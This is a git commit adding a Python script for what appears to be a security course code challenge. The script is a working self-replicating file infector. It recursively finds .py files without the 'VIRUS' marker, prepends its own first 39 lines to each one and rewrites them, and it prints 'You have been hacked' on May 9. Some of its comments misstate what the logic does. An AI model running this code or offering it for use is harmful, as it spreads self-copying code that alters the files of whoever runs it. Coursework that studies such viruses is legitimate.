ca527b08e1cb854f617c7e5a8633a9045797cbd5
nkalderete <nk.alderete@gmail.com>
2023-03-30 22:00:35 +0000

    301 code challenge, class 14

---
+++ 301code14.py
@@ -0,0 +1,67 @@
+#!/usr/bin/python3
+
+# Imports os module
+import os
+# Imports datetime module- used to modify dates and times
+import datetime
+
+# Assigns variable 
+SIGNATURE = "VIRUS"
+
+# Locates file path in directory
+def locate(path):
+    # Creates empty list for variable 'files_targeted'
+    files_targeted = []
+    # os.listdir(path) = Returns list of all files/ directories located in specified path
+    filelist = os.listdir(path)
+    # A for loop checks for 'fname' in 'filelist'
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            files_targeted.extend(locate(path+"/"+fname))
+            # If the file named fname located at the directory path path is not a directory, this line checks if the file extension is .py
+        elif fname[-3:] == ".py":
+            # Sets infected value to false if filename is '.py.
+            infected = False
+            for line in open(path+"/"+fname):
+                # Checks for variable "signature"
+                if SIGNATURE in line:
+                    infected = True
+                    break
+                # If var 'signature' is not found it is considered 'infected' 
+                # Path of file added to 'files_targeted' 
+            if infected == False:
+                files_targeted.append(path+"/"+fname)
+    return files_targeted
+
+# Defines new funtion to infect targeted files
+def infect(files_targeted):
+    virus = open(os.path.abspath(__file__))
+    # "virusstring". An empty string is simply a string with no characters in it. It can be useful as a starting point for building a string that will later be populated with information.
+    virusstring = ""
+    # Loop that checks if number is betweeen 0-38, if within range appends to "virusstring"
+    for i,line in enumerate(virus):
+        if 0 <= i < 39:
+            virusstring += line
+    virus.close
+    # Infects python files named in 'files_targeted'
+    for fname in files_targeted:
+        # variable for function
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        # Open/ write file
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+
+# define new function
+def detonate():
+    # Checks if the date is May 9th 
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        # If date correct print "you have been hacked"
+        print("You have been hacked")
+
+# Calls all created functions 
+files_targeted = locate(os.path.abspath(""))
+infect(files_targeted)
+detonate()
